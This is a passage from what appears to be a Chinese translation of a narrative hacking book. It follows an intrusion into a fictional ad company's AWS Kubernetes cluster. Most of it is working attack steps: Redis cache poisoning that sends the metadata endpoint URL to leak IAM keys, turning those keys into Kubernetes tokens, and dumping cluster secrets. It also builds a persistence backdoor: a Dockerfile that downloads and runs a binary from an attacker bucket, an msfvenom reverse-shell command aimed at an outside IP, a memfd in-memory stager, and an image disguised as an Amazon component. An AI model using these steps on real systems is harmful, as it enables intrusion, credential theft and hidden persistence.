这里我们可能会找到一个入口。我们没有调用 `ObjectInputStream` 的默认 `readObject` 方法，而是调用了目标类 `BidRequest` 中定义的自定义 `readObject` 方法。

这个自定义的 `readObject` 方法几乎可以对接收到的数据做任何事情。在下一个乏味的场景中，它只是将名为 `auctionID` 的属性转为小写，但任何事情都有可能：它可以执行网络调用、读取文件，甚至执行系统命令。而且它都是基于从不受信任的序列化对象获取的输入进行的：

```
// BidRequest is a class that can be serialized
class BidRequest implements Serializable{
    public String auctionID;
    private void readObject(java.io.ObjectInputStream in){
        in.defaultReadObject();
        this.auctionID = this.auctionID.toLowerCase();
        // Perform more operations on the object attributes
    }
}
```

因此，挑战在于构造一个包含正确值并引导 `readObject` 方法的执行流程直至达到系统命令执行或其他有趣结果的序列化对象。这看起来可能像是痴心妄想，但几年前确实有几位研究人员做到了这一点。唯一的区别是，他们在 `commons-collections` 中一个类的 `readObject` 方法中发现了此漏洞，`commons-collections` 是一个随 Java 运行时环境默认提供的 Java 库（请查看 Matthias Kaiser 的演讲“Exploiting Deserialization Vulnerabilities in Java”）。

在这次演讲之后短暂的一段时间里，反序列化漏洞的数量几乎与 Windows 漏洞不相上下。真是令人难以置信！有问题的类的 `readObject` 方法已在 `commons-collections` 库的新版本中得到修复（从 3.2.2 开始），但由于调整 Java 虚拟机（JVM）通常是一个非常危险的过程，基于传说和古老智慧，许多公司抵制升级 JVM 的冲动，从而为反序列化漏洞敞开了大门。

首先，我们需要确保我们的 pod 容易受到此攻击。

如果你还记得，在第 5 章中我们遇到了似乎充当公共 JAR 文件和二进制文件私有仓库的存储桶 `mxrads-dl`。该存储桶应包含 `ads-rtb` 等应用程序使用的几乎所有外部 JAR 文件的版本。因此答案可能就在其中。我们在存储桶的键中搜索 `ysoserial` 工具（https://github.com/frohoff/ysoserial/）支持的易受攻击的 Java 库，该工具用于制作触发许多 Java 类反序列化漏洞的负载。该工具的 GitHub 页面列出了一些众所周知的可被利用的库，例如 `commons-collections` 3.1、`spring-core` 4.1.4 等。

```
root@Point1:~# aws s3api list-objects-v2 --bucket mxrads-dl > list_objects_dl.txt
root@Point1:~# grep 'commons-collections' list_objects_dl.txt
Key: jar/maven/artifact/org.apache.commons-collections/commons-collections/3.3.2
--snip--
```

我们找到了 `commons-collections` 版本 3.3.2。非常接近。我们本可以冒险进行盲目利用，希望存储桶仍在使用本地旧版本的 `commons-collections` 库，但胜算不大，所以我们继续前进。

## Cache Poisoning

我们继续探索 Redis 缓存中的其他键，希望获得一些新的灵感：

```
shell> head -100 all_redis_keys.txt
vast_c88b4ab3d_19devear
select_3799ec543582b38c
vast_c88b4ab3d_19devear
--snip--
```

我们列出键 `vast_c88b4ab3d_19devear` 的内容，这次发现了一个 URL：

```
shell> redis -h 10.59.12.47 get vast_c88b4ab3d_19devear
https://www.goodadsby.com/vast/preview/9612353
```

VAST（Video Ad Serving Template，视频广告投放模板）是用于描述向浏览器视频播放器投放广告的标准 XML 模板，包括媒体下载位置、发送哪些跟踪事件、多少秒后、发送到哪个端点等等。以下是 VAST 文件的一个示例，该文件指向存储在 `s4d.mxrads.com` 上的视频文件，广告标题为“Exotic Approach”：

```
<VAST version="3.0">
<Ad id="1594">
  <InLine>
    <AdSystem>MXR Ads revolution</AdSystem>
    <AdTitle>Exotic approach</AdTitle>
--snip--
    <MediaFile id="134130" type="video/mp4"
      bitrate="626" width="1280" height="720">
      http://s4d.mxrads.com/43ed9014730cb/12ad82436/vid/720/88b4a1cf2.mp4
--snip--
```

XML 解析器可能非常难以捉摸——标签错误，问题就会爆发。解析器会将比原始文件本身更大的堆栈跟踪输出到标准错误输出中。如此多的异常需要妥善处理……并记录！

你明白我的意思了吗？我们已经可以访问处理广告投放相关应用程序日志的 pod。如果我们用例如返回 JSON/文本格式的元数据 API URL 替换 VAST URL，应用程序是否会向我们可以查看的 Elasticsearch 审计存储发送详细的错误信息？

唯一的办法就是试试看。我们用臭名昭著的端点 URL `http://169.254.169.254/latest/meta-data/iam/info` 替换十几个有效的 VAST URL，如下所示：

```
shell> redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\
http://169.254.169.254/latest/meta-data/iam/info
OK
```

此元数据端点应返回包含运行 `ads-rtb` pod 的节点所附加的 IAM 角色的 JSON 响应。我们知道该角色存在，因为 EKS 需要它。额外加分：该角色具有一些有趣的权限。
大约需要 10 分钟才会触发其中一个被污染的缓存条目，但我们最终得到了期望的详细错误。我们可以通过搜索 MXR Ads 的 AWS 账户 ID `886371554408` 在日志索引中定位该错误：



`shell> curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: 886371554408"`

`"level": "Critical"`

`"message": "...\"InstanceProfileArn\" : 

\"arn:aws:iam::886371554408:instance-profile/eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC\"...org.xml.sax.SAXParseException...Not valid XML file"`

```
```

触发查询的 pod 正在使用 IAM 角色 `eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC` 运行。现在我们只需再次污染 Redis 缓存，但这次在 URL 中附加角色名称以获取其临时访问密钥：

```
shell> redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\
http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-workers-prod-common-NodeInstanceRole-BZUD6DGQKFGC
OK
```

几分钟后，我们在日志索引中获得了梦寐以求的奖品，即具有 EKS 节点权限的有效 AWS 访问密钥：

```
shell> curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: AccessKeyId"
"level": "Critical"
"message": "...\"AccessKeyId\" : \"ASIA4A4ZRK6WS3R64ZPDI\", \"SecretAccessKey\" : \"\n\"+EplZs...org.xml.sax.SAXParseException...Not valid XML file"
```

根据 AWS 文档，附加到 Kubernetes 节点的默认角色将对 EC2 具有基本权限以发现其环境：`describe-instances`、`describe-security-groups`、`describe-volumes`、`describe-subnets` 等。让我们试用这些新凭据并列出 `eu-west-1` 区域（爱尔兰）中的所有实例：

```
root@Point1:~# vi ~/.aws/credentials
[node]
aws_access_key_id = ASIA4A4ZRK6WS3R64ZPDI
aws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ
aws_session_token = AgoJb3JpZ2luX2...
root@Point1:~# aws ec2 describe-instances \
--region=eu-west-1 \
--profile node
--snip--
```

```
"InstanceId": "i-08072939411515dac",
"InstanceType": "c5.4xlarge",
"KeyName": "kube-node-key",
"LaunchTime": "2019-09-18T19:47:31.000Z",
"PrivateDnsName": "ip-192-168-12-33.eu-west-1.compute.internal",
"PrivateIpAddress": "192.168.12.33",
"PublicIpAddress": "34.245.211.33",
"StateTransitionReason": "",
"SubnetId": "subnet-00580e48",
"Tags": [
{
"Key": "k8s.io/cluster-autoscaler/prod-euw1",
"Value": "true"
}],
--snip--
```

事情看起来很不错。我们获得了大约 700 台 EC2 机器的完整描述，包括私有和公有 IP 地址、防火墙规则、机器类型等。这已经是很多机器了，但对于规模如 MXR Ads 的公司来说，这个数字相对较小。有些不对劲。

全部机器都带有特殊标签 `k8s.io/cluster-autoscaler/prod-euw1`。这是 `autoscaler` 工具 (`https://github.com/kubernetes/autoscaler/`) 常用的一个标签，用来标记可丢弃的节点，当 Pod 活动量较低时可以将其杀掉。MXR Ads 很可能利用了这个标签来限制分配给 Kubernetes 节点的默认权限的范围。确实很聪明。

讽刺的是，该标签泄露了 Kubernetes 集群名称（`prod-euw1`），而这是在调用 `describeCluster` API 时的必填参数。那就调用 `describeCluster` 吧：

```
root@Point1:~/# export AWS_REGION=eu-west-1
root@Point1:~/# aws eks describe-cluster --name prod-euw1 --profile node
{ "cluster": {
① "endpoint": "https://BB061F0457C63.y14.eu-west-1.eks.amazonaws.com",
② "roleArn": "arn:aws:iam::1886477354405:role/eks-prod-role",
"vpcId": "vpc-05c5909e230201771",
"endpointPublicAccess": false,
"endpointPrivateAccess": true,
--snip--
```

API 服务器就是那个长 URL，方便地命名为 `endpoint` ①。在某些罕见的配置中，它可能暴露在互联网上，使得查询/更改集群的期望状态变得更加方便。

我们获得的角色 ② 可以做得远不止简单地探索 Kubernetes 资源。在默认设置下，该角色有权将任何安全组附加到集群中的任何其他节点。现在我们获得了此角色，只需找到一个向互联网暴露所有端口的现有安全组——总有一个——并将其分配给托管我们当前 shell 的机器。

不过别急。虽然诱人将我们手工制作的基于 S3 的反向 shell 升级为全双工通信通道，但 MXR Ads 很可能通过 `Terraform` 声明了他们的 Kube 集群，即应该理想运行多少台机器、其网络配置应是什么样、以及为每台机器分配哪些安全组。如果我们更改这些参数，该更改将在下一次 `terraform plan` 命令中被标记。一个允许所有入站流量进入随机节点的安全组只会引发我们宁愿避免的问题。

我们继续尝试使用附加到 Kube 节点的角色，但它很快就达到了极限。它被限制得如此严重，以至于失去了所有兴趣。我们只能描述集群组件的一般信息。我们无法访问机器的用户数据，也几乎无法做出任何更改而不惊动警报。

仔细想想，为什么我们只把这个节点当作 AWS 资源来看待？它首先是一个 Kubernetes 资源。而且是一个特权的资源。在 AWS 环境中，这个节点可能拥有可笑的权限，但在 Kubernetes 世界中，它是至高无上的神，因为它对领域内的 Pod 拥有生杀大权。

如前所述，每个节点都运行着一个名为 `kubelet` 的进程，它轮询 API 服务器以生成或终止新的 Pod。运行容器意味着挂载卷、注入密钥...它到底是如何获得这种级别的访问权限的？

答案：通过节点的实例配置文件——也就是我们整个过程中一直在使用的角色。

当你在 EKS 上设置 Kubernetes 集群时，在启动节点之前要应用的第一个配置之一就是将节点 IAM 角色名称添加到 `system:nodes` 组。该组绑定到 Kubernetes 角色 `system:node`，该角色对各种 Kube 对象具有读取权限：服务、节点、Pod、持久卷以及另外 18 种资源！

我们要继承这些权限所要做的就是让 AWS 将我们的 IAM 访问密钥转换为有效的 Kubernetes 令牌，以便我们可以作为 `system:nodes` 组的合法成员查询 API 服务器。为此我们调用 `get-token` API：

```
root@Point1:~/# aws eks get-token --cluster-name prod-euw1 --profile node
{
  "kind": "ExecCredential",
  "apiVersion": "client.authentication.k8s.io/v1alpha1",
  "status": {
    "expirationTimestamp": "2019-11-14T21:04:23Z",



`"token": "k8s-aws-v1.aHR0cHM6Ly9zdHMUw1hem..."`

}

}

```
这次获得的令牌不是标准的 JWT；而是包含对 STS 服务的 GetCallerIdentity API 的调用的构建块。让我们使用 `jq`、`cut`、`base64` 和 `sed` 的组合来解码我们之前获得的令牌的一部分：

```
root@Point1:~/# aws eks get-token --cluster-name prod-euw1 \
| jq -r .status.token \
```

```
| cut -d"_" -f2 \
| base64 -d \
| sed "s/8/\\n/g"
```

```
https://sts.amazonaws.com/?Action=GetCallerIdentity
&Version=2011-06-15
&X-Amz-Algorithm=AWS4-HMAC-SHA256
&X-Amz-Credential=ASIA4A4ZRK6WSYQ5EI4NS%2F20191118/us-east-1/sts/aws4_request
&X-Amz-Date=20191118T204239Z
&X-Amz-Expires=60
&X-Amz-SignedHeaders=host;x-k8s-aws-id
&X-Amz-Security-Token=IQoJb3pJz1uX2VjEIX////...
```

JWT 实际上是一个编码的预签名 URL，其中包含节点的身份。任何人都可以重放此 URL 以验证节点确实是它声称的那个人。EKS 在收到此令牌时正是这样做的。正如 AWS IAM 信任 OpenID 来识别和验证 Kube 用户（通过 JWT 的方式），EKS 也信任 IAM 通过对 `sts.amazon.com` 端点的网络调用来实现同样的目的。

我们可以在 `curl` 命令中使用此令牌访问 API 服务器，就像我们之前做的那样，但最好生成一个完整的 Kubectl 配置，我们可以将其下载到我们那个值得信赖的 Pod 中：

```
root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node
Updated context arn:aws:eks:eu-west-1:1886477354405:cluster/prod-euw1 in /root/.kube/config
shell> wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/config
shell> mkdir -p /root/.kube && cp config /root/.kube/
```

测试我们是否获得了新权限的一种快速方法是列出 sacred `kube-system` 命名空间中的 Pod。这是一个包含主 Pod 的命名空间——`kube api-server`、`etcd`、`coredns`——以及用于管理 Kubernetes 的其他关键 Pod。记住我们之前的令牌仅限于 `prod` 命名空间，因此获得对 `kube-system` 的访问权限将是巨大的进步：

```
shell> kubectl get pods -n kube-system
```

| 名称 | 就绪 | 状态 | 重启次数 | 年龄 |
|---|---|---|---|---|
| aws-node-hl227 | 1/1 | Running | 0 | 82m |
| aws-node-v7hrc | 1/1 | Running | 0 | 83m |
| coredns-759d6fc95f-6z9w | 1/1 | Running | 0 | 89m |
| coredns-759d6fc95f-ntq88 | 1/1 | Running | 0 | 89m |
| kube-proxy-724jd | 1/1 | Running | 0 | 83m |
| kube-proxy-qtc22 | 1/1 | Running | 0 | 82m |
| --snip-- | | | | |

我们成功列出了 Pod！不错！显然，由于我们使用的是托管 Kubernetes，最重要的 Pod（`kube-apiserver`、`etcd`、`kube-controller-manager`）被 Amazon 隐藏了，但其余的 Pod 都在那里。

## Kube 权限提升

让我们好好利用我们新的权限。我们想做的第一件事是抓取 Kube 中定义的所有密钥；然而，当我们尝试时，我们发现尽管 `system:nodes` 组在技术上拥有这样做的权限，但它不能随意请求密钥：

```
shell> kubectl get secrets --all-namespaces
Error from server (Forbidden): secrets is forbidden:
User "system:node:ip-192-168-98-157.eu-west-1.compute.internal" cannot list
resource "secrets" in API group "" at the cluster scope: can only read
namespaced object of this type
```

在 Kubernetes `1.10` 版本中引入的一项安全功能限制了归因于节点的过度权力：节点授权。该功能建立在经典的基于角色的访问控制之上。节点只有在同一节点上调度了需要该密钥的 Pod 时，才能行使其检索密钥的能力。当这些 Pod 终止时，节点将失去对该密钥的访问权限。

不过没有理由恐慌。任何随机节点通常在任何给定时间都会托管数十个甚至数百个不同的 Pod，每个 Pod 都有自己的肮脏密钥、卷数据等等。也许今天晚上 11 点我们的节点只能检索一个虚拟数据库的密码，但再给它 30 分钟，`kube-scheduler` 可能会向节点发送一个具有集群管理员权限的 Pod。关键在于在正确的时间出现在正确的节点上。我们列出当前机器上运行的 Pod，以了解我们有权获取哪些密钥：

```
shell> kubectl get pods --all-namespaces --field-selector\
spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal
prod   ads-rtb-deployment-13fe-3evx  1/1  Running
prod   ads-rtb-deployment-12dc-5css  1/1  Running
prod   kafka-feeder-deployment-23ee  1/1  Running
staging digital-elements-deploy-83ce 1/1  Running
test   flask-deployment-5d76c-qb5tz  1/1  Running
--snip--
```

大量异构应用程序托管在单个节点上。这看起来很有希望。节点很可能可以访问跨各种组件的大量密钥。我们使用自定义解析器自动列出每个 Pod 挂载的密钥：

```
shell> ./kubectl get pods -o="custom-columns=\
NS:.metadata.namespace,\
POD:.metadata.name,\
ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\
FILESECRET:.spec.volumes[*].secret.secretName" \
--all-namespaces \
--field-selector spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal
```

| 命名空间 | Pod | 环境 | 文件 Secret |
|---|---|---|---|
| prod | kafka... | awsUserKafka | kafka-token-653ce |
| prod | ads-rtb... | CassandraDB | default-token-c3de |
| prod | ads-rtb... | CassandraDB | default-token-8dec |
| staging | digital... | GithubBot | default-token-88ff |
| test | flask... | AuroraDBTest | default-token-913d |
| --snip-- |  |  |  |

宝藏！Cassandra 数据库、AWS 访问密钥、服务账号、Aurora 数据库密码、GitHub 令牌、更多 AWS 访问密钥……这真的存在吗？我们使用相当明确的命令 `kubectl get secret` 下载（并解码）每个密钥，如下所示：



shell> `./kubectl get secret awsUserKafka -o json -n prod` \
| `jq .data`

  `"access_key_id": "AKIA4A4ZRK6WSSKDSKQDZ"`,

  `"secret_key_id": "93pLDv0F1QxnpyQSQvrMZ9ynbl9gdNkRUP1g00S"`

shell> `./kubectl get secret githubBot -o json -n staging`\
| `jq .data`

  `"github-bot-ro": "9c13d31aaedc0cc351dd12cc45ffafbe89848020"`

shell> `./kubectl get secret kafka-token-653ce -n prod -o json` | `jq -r .data.token`

`"ZX1KaGJH Y2 1PaUpTVXpJM U5pSXNJbXRwZkNJKp5jkuz..."`

看我们检索到的所有这些凭证和令牌！我们还没完。远没完。看，这只是一个恰好运行了存在不安全 Redis 容器的 `ads-rtb` pod 的节点。还有 200 个类似的 pod 分布在 700 台机器上，它们容易受到同样的缓存投毒技术攻击。

这种黑客攻击的公式很简单：定位这些 pod（使用 `get pods` 命令），连接到 Redis 容器，用元数据 API 替换几个 VAST URL，收集泄露到审计数据库的机器临时 AWS 密钥，将它们转换为 Kubernetes 令牌，并检索节点上运行的 pod 加载的密钥。

我们反复进行，检查每个节点，并在输出中注意到非常有趣的东西时停止：

```
shell> ./kubectl get pods -o="custom-columns=\
NS:.metadata.namespace,\
POD:.metadata.name,\
ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\
FILESECRET:.spec.volumes[*].secret.secretName" \
--all-namespaces \
--field-selector spec.nodeName=ip-192-168-133-34.eu-west-1.compute.internal
```

| 命名空间 | Pod | 环境 | 文件 Secret |
|---|---|---|---|
| kube-system | tiller | <none> | tiller-token-3cea |
| prod | ads-rtb... | CassandraDB | default-token-99ed |

我们遇到了幸运的节点编号 `192.168.133.34` ①，它表示它托管了一些属于全能 `kube-system` 命名空间的 pod。这个 `tiller` pod 有大约 90% 的可能性拥有集群管理员权限。它在 `helm v2` 中扮演着核心角色，`helm v2` 是用于在 Kubernetes 上部署和管理应用程序的包管理器。我们冒充该节点并下载 `tiller` 的服务账号令牌：

```
root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node133
--snip--
shell> ./kubectl get secret tiller-token-3cea \
-o json \
--kubeconfig ./kube/config_133_34 \
| jq -r .data.token
ZX1KaGJH Y2lPaUpTVXpJMUSpSXNJbXRwKkNJKlpSjkuZX1KcGMzTW1PaU...
```

手握这个强大的账号，我们可以用一条粗命令捕获所有密钥。去他的节点授权吧！我们将账号令牌写入一个名为 `tiller_config` 的有效 Kubectl 配置，并用它来查询集群：

```
shell> kubectl get secrets \
--all-namespaces \
-o json \
--kubeconfig ./kube/tiller_config
"abtest_db_user": "abtest-user-rw",
"abtest_db_pass": "azg3Wk+sWfPpNRW43Yo",
"api_token": "dfb87c2be386dc11648d1bfb5e9c57d5",
"ssh_metrics": "--- BEGIN SSH PRIVATE KEY --- ..."
"github-bot-ro": "9c13d31aaedc0cc351dd12cc45ffafbe89848020"
```

由此，我们获得了超过 100 个凭证，涵盖几乎所有数据库：Cassandra、MySQL，你能想到的都有。如果它与广告投放有关，可以放心我们有办法访问它。我们甚至恢复了一些 SSH 私钥。我们目前还不知道如何使用它们，但弄清楚应该不会花太长时间。

我们还获得了几个有效的 AWS 访问密钥，其中一个属于一名开发者 Kevin Duncan。这将会很有用。我们将它们添加到我们的凭证文件中，并执行一次 API 调用以确认它们确实有效：

```
root@Point1:~/# vi ~/.aws/credentials
[kevin]
aws_access_key_id = AKIA4A4ZRK6WSSKDSKQDZ
aws_secret_access_key = 93pLDvoFlQXnpy+Ep1ZsWmW/5r/+B/+KJ
root@Point1:~/# aws iam get-user --profile kevin
"User": {
  "Path": "/",
  "UserName": "kevin.duncan",
  "Arn": "arn:aws:iam::886371554408:user/kevin.duncan",
```

最后，我们也确保抓取属于 `github-bot-ro` 的 GitHub 令牌。我们通过使用下面几行 Python 代码执行快速 API 调用来确保它仍然有效：

```
root@Point1:~/# python3 -m pip install PyGithub
root@Point1:~/# python3
>>> from github import Github
>>> g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")
>>> print(g.get_user().name)
mxrads-bot-ro
```



他们说得对。Kubernetes 真的有趣！

我们可以安全地说，我们目前已经控制了 MXR Ads 的投放基础设施。我们仍然不知道配置文件定向是如何工作的，也不知道 Gretsch Politico 的最终客户是谁，但我们可以更改、删除和阻止他们所有的广告活动——可能还有更多。

在我们更深入地探索这个兔子洞之前，我们需要确保我们辛苦获得的位置。容器具有很高的波动性，这使我们当前的访问面临风险。只要对 `surveys` 应用进行一次新的部署，我们的 shell 访问就会被杀死——以及我们进入 MXR Ads Kubernetes 集群的主要入口点。

### 资源

- 有关 Kubernetes 中 RBAC 的更多信息：https://www.liquidweb.com/kb/kubernetes-rbac-authorization/.
- John Lambert 关于防御者思维的开创性文章：https://github.com/JohnLaTwC/Shared.
- JSON Web Token 简介：http://bit.ly/35fTJyp.
- Kubernetes API 参考：https://www.sparcflow.com/docs/kube-api-v1.19.html.
- Kubectl 命令列表：https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands.
- 有关 OpenID 的信息，这是一种用于将身份验证委托给第三方身份验证标准：https://developers.onelogin.com/openid-connect/.
- 附加到 Pod 的 IAM 角色：https://docs.aws.amazon.com/eks/latest/userguide/worker_node_IAM_role.html.
- AWS 关于管理 EKS 自动扩缩容组的文档：https://amzn.to/2uJeXQb.
- Kubernetes 中网络策略的探索：https://banzaicloud.com/blog/network-policy/.
- 在 Minikube 集群上安装 Helm 和 Tiller 的演练：http://bit.ly/2tgPBIQ
- 实时竞价的解释：https://digiday.com/media/what-is-real-time-bidding/.

## 9

## 粘性 Shell

![](img/961e81aef23040d0fbe348f58c055860_173_0.png)

持久性在处理像 Kubernetes 这样易变且可再生的基础设施时呈现出全新的维度。容器和节点往往被视为不可变且可丢弃的对象，可以随时随地消失。

这种波动性在 AWS 机器上因使用称为 spot 实例的特殊类型而进一步加剧。公司可以以大约常规价格 40% 的价格生成几乎任何类型的 spot 实例。问题在于 AWS 有权在需要回收入计算资源时随时收回机器。虽然这种设置对于 Kubernetes 集群来说似乎理想——容器可以自动迁移到健康的机器，新的节点可以在几秒钟内重新生成——但它确实给可靠的长期后门带来了新的挑战。

持久性过去是关于后门二进制文件、在机器上运行秘密 shell 以及植入 Secure Shell (SSH) 密钥。在平均机器寿命只有几个小时的世界里，这些选项都无法提供稳定、长期的访问。

好消息是，使用 100% spot 实例为集群构建风险极高，以至于没有严肃的公司会设置这样的集群——至少不是用于处理关键工作负载。如果 AWS 突然出现大量收回，集群可能无法足够快地扩展以满足客户需求。出于这个原因，成本效益的弹性常见策略是让关键工作负载的稳定部分安排在少量常规实例的最小基座上，并用 spot 实例吸收流量波动。

后门这种波动基础设施的一种懒惰方式是定位这组珍贵的机器——它们通常是集群中最老的机器——并使用老式方法对它们进行后门。我们可以设置一个定期拉取并执行反向 shell 的 cron 作业。我们可以使用二进制植入，即用执行远程代码、授予 root 权限并执行其他恶作剧行为的变体替换常见的工具如 `ls`、`Docker` 和 `SSHD`。我们可以插入 rootkit，这被视为对系统（库、内核结构等）的任何修改，允许或维持访问（在 Linux 上查看一个示例 rootkit https://github.com/croemheld/lkm-rootkit/）。

在列表 9-1 中，我们检索机器并按其创建时间戳排序。

```
shell> ./kubectl get nodes -sort-by=.metadata.creationTimestamp

Name

ip-192-168-162-15.eu-west-1.... Ready 14 days

ip-192-168-160-34.eu-west-1.... Ready 14 days

ip-192-168-162-87.eu-west-1.... Ready 14 days

ip-192-168-162-95.eu-west-1.... Ready 12 days

ip-192-168-160-125.eu-west-1.... Ready 9 days

--snip--
```

列表 9-1：查找最旧的节点以定位集群的稳定部分

每个节点支持不同的服务，因此后门十几个这样的节点应该能给我们至少几天有保证的访问。shell 然后会随着节点一起自动消失，埋葬我们恶作剧的任何证据。这是最完美的犯罪。

> 注意 好吧，几乎所有证据都会被埋葬。并非所有工件都仅位于系统上，因此我们可能会通过捕获网络数据包的虚拟私有云（VPC）流日志、记录大多数 API 调用的 CloudTrail 等留下痕迹。

但如果几天时间不足以找到进入 Gretsch Politico 网络的方法呢？我们能以某种方式更持久吗？毕竟，我们处于一个可以自我适应和自我修复的环境中。如果它连我们的后门一起修复，那不是很神奇吗？

如果我们开始将后门视为容器或 pod，那么也许我们可以利用 Kubernetes 的黑暗巫术来确保总有一个副本在某个地方始终运行。这种雄心的风险

然而不可掉以轻心。Kubernetes 提供了关于其所有组件的极其详尽的洞察和指标，因此使用实际的 Kubernetes Pod 作为后门会让潜伏变得有点棘手。

持久化始终是一场权衡的游戏。是否应该为了更持久的访问而牺牲隐蔽性，还是保持极低的隐蔽性并接受在稍有波动时就失去来之不易的 shell？对此见仁见智，这将取决于多个因素，例如攻击基础设施匿名性的信心、目标的安全等级、风险承受能力等等。

这个看似不可能的困境其实有一个显而易见的解决方案：使用具有不同属性的多个后门。我们将同时拥有一个稳定但略显普通的后门和一个隐蔽但不稳定的 shell。第一个后门将由一个巧妙隐藏在明处的 Pod 组成，作为我们的主要作战中心。该 Pod 会定期回连家门，寻找要执行的命令。这也提供了直接的互联网连接，而我们当前的 shell 缺少这一点。无论出于何种原因，只要它被销毁，Kube 就会急忙将其复活。与此同时，我们还会放置另一个更隐蔽的程序，它会休眠直到我们发送预定义信号。这给了我们在第一个后门被好奇的管理员发现时重新进入系统的秘密途径。

这些多个后门不应共享任何入侵指标：它们将联系不同的 IP、使用不同的技术、运行不同的容器，并且彼此完全隔离。调查人员发现具有某些属性的一个种子，不应能够利用此信息找到其他后门。理论上，一个的灭亡不应使其他后门面临风险。

### 稳定访问

稳定后门例如能够在数百个可用节点中的少数几个上运行。这个 rogue 容器将是一个精简镜像，在启动时加载并执行文件。我们将使用 Alpine，一种约 5MB 的极简发行版，常用于启动容器。

在清单 9-2 中，我们开始编写 `Dockerfile`，以便在 Alpine 容器内下载并运行任意文件。

```
#Dockerfile

FROM alpine

CMD ["/bin/sh", "-c", "wget https://amazon-cni-plugin-essentials.s3.amazonaws.com/run -O /root/run && chmod +x /root/run && /root/run"]
```



# 清单 9-2：一个 Dockerfile，用于构建在启动后下载并运行可执行文件的容器

由于 MXR Ads 如此钟爱 S3，我们从我们拥有的 S3 存储桶中拉取未来的二进制文件，我们狡猾地将其命名为 `amazon-cni-plugin-essentials`（稍后会详细介绍名称）。

二进制文件（也称为代理）可以是您喜欢的任何自定义或样板反向 shell。一些黑客甚至可能不在乎在 Linux 机器上运行一个原版的 meterpreter 代理。如第 1 章所述，我们构建的攻击框架可靠稳定，很少有公司愿意投资昂贵的端点检测响应解决方案来保护其 Linux 服务器，尤其是在 Kubernetes 集群中的临时机器中。这使得像 Metasploit 这样的现成利用框架成为一个合理的选择。

尽管如此，我们仍会谨慎行事，花几秒钟构建一个不太可能触发隐藏线路的可靠有效载荷。

我们前往实验室并生成一个无分段的原版 HTTPS meterpreter。无分段有效载荷是完全自包含的，不需要在启动时从互联网下载额外代码。meterpreter 直接注入到我们选择的 ELF/PE 二进制文件的可执行 `.text` 部分（前提是模板文件有足够的空间）。在清单 9-3 中，我们选择 `/bin/ls` 二进制文件作为模板并将其反向 shell 偷偷塞入。

```
root@Point1:~# docker run -it phocean/msf ./msfvenom -p \
linux/x64/meterpreter_reverse_https \
LHOST=54.229.96.173 \
LURI=/msf \
-x /bin/ls \
LPORT=443 -f elf > /opt/tmp/stager
[*] Writing 1046512 bytes to /opt/tmp/stager...
```

## 清单 9-3：在普通的 `/bin/ls` 可执行文件中嵌入 meterpreter

简单明了。现在，与其像任何经典二进制文件一样从磁盘运行此文件，我们希望仅从内存中触发其执行以挫败潜在的安全解决方案。如果有效载荷是常规 shellcode 而不是字面二进制文件，我们只需要将其复制到读写执行内存页然后跳转到有效载荷的第一字节即可。

然而，由于我们的 `meterpreter_reverse_https` 有效载荷生成了一个完整的 ELF 二进制文件，反射式地将其加载到内存中需要额外的工作：我们必须手动加载导入的 DLL 并解析本地偏移。请参阅本章末尾的资源，了解如何处理此问题。幸运的是，Linux 3.17 引入了一个系统调用工具，提供了一种更快实现相同结果的方法：`memfd`。

该系统调用创建一个完全存在于内存中并像任何常规磁盘文件一样表现的虚拟文件。使用虚拟文件的符号链接 `/proc/self/fd/<id>`，我们可以打开虚拟文件、更改它、截断它，当然也可以执行它！

执行此操作的主要五个步骤如下：

- 1. 使用 XOR 操作加密原版 meterpreter 有效载荷。
- 2. 将结果存储在 S3 存储桶中。
- 3. 制作一个 stager，在目标机器上通过 HTTPS 下载加密的有效载荷。
- 4. 在内存中解密有效载荷并使用 `memfd` 系统调用初始化一个“匿名”文件。
- 5. 将解密后的有效载荷复制到此仅内存文件然后执行它。

## 清单 9-4：stager 的高层操作

清单 9-4 是我们 stager 将采取的主要步骤的简要 walkthrough——如常，完整代码托管在 GitHub 上。

```
func main() {
    // Download the encrypted meterpreter payload
    data, err := getURLContent(path)
    // Decrypt it using XOR operation
    decryptedData := decryptXor(data, []byte("verylongkey"))
    // Create an anonymous file in memory
    mfd, err := memfd.Create()
    // Write the decrypted payload to the file
    mfd.Write(decryptedData)
    // Get the symbolic link to the file
    filePath := fmt.Sprintf("/proc/self/fd/%d", mfd.Fd())
    // Execute the file
    cmd := exec.Command(filePath)
    out, err := cmd.Run()
}
```

就这样。我们不需要做任何晦涩的偏移计算、库热加载、修补过程链接表（PLT）段或其他危险技巧。我们有一个可靠的 stager，它仅在内存中执行文件，并且保证在任何最近的 Linux 发行版上都能工作。

我们编译代码然后上传到 S3：

```
root@Point1:opt/tmp# aws s3api put-object \
--key run \
--bucket amazon-cni-plugin-essentials \
--body ./run
```

最后，为了进一步增强欺骗网络，当我们构建容器的镜像并推送到我们自己的 AWS ECR 注册表（ECR 是 AWS 上的 Docker Hub 等价物）时，我们假装成合法的 Amazon 容器 `amazon-k8s-cni` 进行操作：

```
root@Point1:~/# docker build \
-t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .
Successfully built be905757d9aa
Successfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
# Authenticate to ECR
root@Point1:~/# $(aws ecr get-login --no-include-email --region eu-west-1)
root@Point1:~/# docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
```

